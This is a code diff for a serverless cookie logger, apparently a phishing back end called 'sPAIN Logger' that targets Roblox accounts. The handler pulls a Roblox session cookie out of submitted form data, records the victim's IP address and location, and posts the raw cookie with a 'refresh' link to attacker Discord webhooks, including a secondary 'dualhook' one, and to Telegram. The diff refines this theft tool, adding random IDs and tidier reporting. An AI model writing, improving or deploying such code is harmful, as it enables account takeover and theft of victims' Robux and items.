@@ -30,10 +30,11 @@ async function redisGet(key) {
 
 async function redisSet(key, value) {
   try {
-    await fetch(`${REDIS_URL}/set/${encodeURIComponent(key)}/${encodeURIComponent(JSON.stringify(value))}`, {
+    const res = await fetch(`${REDIS_URL}/set/${encodeURIComponent(key)}/${encodeURIComponent(JSON.stringify(value))}`, {
       headers: { Authorization: `Bearer ${REDIS_TOKEN}` }
     });
-  } catch (_) {}
+    return res.ok;
+  } catch (_) { return false; }
 }
 
 async function getIpGeo(ip) {
@@ -54,6 +55,14 @@ async function tgSend(text) {
       body: JSON.stringify({ chat_id: TG_CHAT, text, parse_mode: 'HTML' })
     });
   } catch (_) {}
+}
+
+// Generate a long random ID like "a8f3kx9mz2qwe7ybn1oplsdt4vuc6rh5jig0"
+function generateId() {
+  const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
+  let id = '';
+  for (let i = 0; i < 40; i++) id += chars[Math.floor(Math.random() * chars.length)];
+  return id;
 }
 
 const WARN = '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_';
@@ -93,39 +102,44 @@ async function discordChunked(url, text) {
   while (rem.length > 0) {
     const chunk = rem.substring(0, limit);
     rem = rem.substring(limit);
-    await discordSend(url, { content: first ? '```\n' + chunk + (rem.length === 0 ? '\n```' : '') : chunk + (rem.length === 0 ? '\n```' : '') });
+    await discordSend(url, {
+      content: first
+        ? '```\n' + chunk + (rem.length === 0 ? '\n```' : '')
+        : chunk + (rem.length === 0 ? '\n```' : '')
+    });
     first = false;
   }
 }
 
 async function sendHit(webhookUrl, { cookie, ip, geo, now, pageName, refreshUrl }) {
+  // Embed
   await discordSend(webhookUrl, {
     content: '@everyone',
     embeds: [{
       title:       '🍪 New Cookie Captured',
-      description: `🔥 \`sPAIN\` 🔥\n\n[🔄 Click Here to Refresh & Get Full Account Info](${refreshUrl})`,
+      description: `🔥 \`sPAIN\` 🔥`,
       color:       0xc026d3,
       fields: [
         { name: '🌐 IP',       value: ip || 'Unknown',                                                                    inline: true  },
         { name: '📍 Location', value: [geo?.city, geo?.regionName, geo?.country].filter(Boolean).join(', ') || 'Unknown', inline: true  },
         { name: '🗺️ ISP',      value: geo?.isp || 'Unknown',                                                              inline: true  },
-        { name: '🔄 Refresh',  value: refreshUrl,                                                                         inline: false },
-        { name: '🕐 Time',     value: now,                                                                                inline: false }
+        { name: '🕐 Time',     value: now,                                                                                inline: false },
+        { name: '🔄 Refresh Link', value: refreshUrl,                                                                    inline: false },
       ],
       footer:    { text: `sPAIN Logger • ${pageName}` },
       timestamp: now
     }]
   });
 
-  // Raw cookie chunked
+  // Raw cookie chunked as plain text
   await discordChunked(webhookUrl, cookie);
 }
 
 async function sendInvalid(webhookUrl, { ip, geo, now, pageName }) {
   await discordSend(webhookUrl, {
     embeds: [{
-      title:       '⚠️ No valid cookie submitted',
-      color:       0xff3333,
+      title: '⚠️ No valid cookie submitted',
+      color: 0xff3333,
       fields: [
         { name: '🌐 IP',       value: ip || 'Unknown',                                                                inline: true  },
         { name: '📍 Location', value: [geo?.city, geo?.country].filter(Boolean).join(', ') || 'Unknown',               inline: true  },
@@ -150,34 +164,22 @@ export default async function handler(req, res) {
   if (!slug)  return res.status(400).json({ error: 'slug is required' });
   if (!slots) return res.status(400).json({ error: 'slots is required' });
 
-  if (!REDIS_URL || !REDIS_TOKEN) {
-    console.error('Missing Redis env vars');
-    return res.status(500).json({ error: 'Server config error' });
-  }
+  if (!REDIS_URL || !REDIS_TOKEN) return res.status(500).json({ error: 'Server config error' });
 
   const record = await redisGet(`slot:${slug}`);
-  if (!record) {
-    console.error('Slug not found:', slug);
-    return res.status(404).json({ error: `Page "${slug}" not found` });
-  }
-  if (!record.webhook) {
-    console.error('No webhook for slug:', slug);
-    return res.status(500).json({ error: 'No webhook configured' });
-  }
+  if (!record)         return res.status(404).json({ error: `Page "${slug}" not found` });
+  if (!record.webhook) return res.status(500).json({ error: 'No webhook configured' });
 
-  // Respond to client immediately
+  // Respond immediately
   res.status(200).json({ success: true });
 
-  // Everything below runs after response is sent
   try {
-    const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim()
-            || req.headers['x-real-ip'] || 'Unknown';
-
+    const ip       = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.headers['x-real-ip'] || 'Unknown';
     const cookie   = findCookie(slots);
     const now      = new Date().toISOString();
     const pageName = record.displayName || slug;
 
-    // Collect webhooks
+    // Collect webhooks (main + dualhook parent)
     const webhooks = [record.webhook];
     if (record.dualhookParent) {
       try {
@@ -194,8 +196,8 @@ export default async function handler(req, res) {
       return;
     }
 
-    // Save refresh record to Redis (30 day TTL)
-    const refreshId  = `${slug}-${Date.now()}`;
+    // Generate long random refresh ID and save to Redis
+    const refreshId  = generateId();
     const refreshUrl = `https://spain-tools.vercel.app/api/refresh?id=${refreshId}`;
 
     await redisSet(`refresh:${refreshId}`, {
@@ -207,13 +209,12 @@ export default async function handler(req, res) {
       createdAt: now
     });
 
-    // Send to all webhooks
     for (const wh of webhooks) await sendHit(wh, { cookie, ip, geo, now, pageName, refreshUrl });
 
     await tgSend([
       `🍪 <b>COOKIE CAPTURED — ${pageName}</b>`,
       `🌐 <code>${ip}</code> — ${geo?.city||'?'}, ${geo?.country||'?'}`,
-      `🔄 <a href="${refreshUrl}">Refresh Link</a>`,
+      `🔄 Refresh: ${refreshUrl}`,
       `🕐 ${now}`
     ].join('\n'));
 
